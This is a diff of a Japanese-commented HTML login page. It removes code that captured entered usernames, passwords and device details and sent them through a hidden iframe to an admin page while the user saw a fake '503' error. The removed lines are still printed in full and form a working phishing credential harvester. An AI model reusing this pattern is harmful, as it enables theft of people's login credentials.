@@ -35,7 +35,7 @@
     </form>
   </div>
 
-  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示される画面） -->
+  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示され、そのまま留まる） -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
@@ -43,45 +43,12 @@
   </div>
 
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const adminUrl = urlParams.get('admin') || 'admin.html';
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      if (ua.includes("iPhone")) return "iPhone (iOS)";
-      if (ua.includes("iPad")) return "iPad (iOS)";
-      if (ua.includes("Android")) return "Androidスマホ";
-      if (ua.includes("Windows")) return "Windows PC";
-      if (ua.includes("Mac")) return "Mac PC";
-      return "不明な端末";
-    }
-
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const device = getDeviceInfo();
-      const time = new Date().toLocaleTimeString();
-
-      const params = new URLSearchParams({
-        time: time,
-        device: device,
-        username: username,
-        password: password
-      });
-
-      // 1. スマホ側にはログイン画面を消して「エラー画面（メンテナンス中）」を出す！
+      // ログインボタンを押したら、フォームを隠してエラー画面を表示し、そこで完全にストップ！
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
-
-      // 2. PC側（管理者画面）にデータを送るための隠し通信（裏で別タブを開いてデータを飛ばすなど）
-      // または、本番でPC画面に即座に反映させるための処理
-      // ※スマホの画面自体はエラー画面のまま動きません！
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = `${adminUrl}?${params.toString()}`;
-      document.body.appendChild(iframe);
     });
   </script>
 </body>
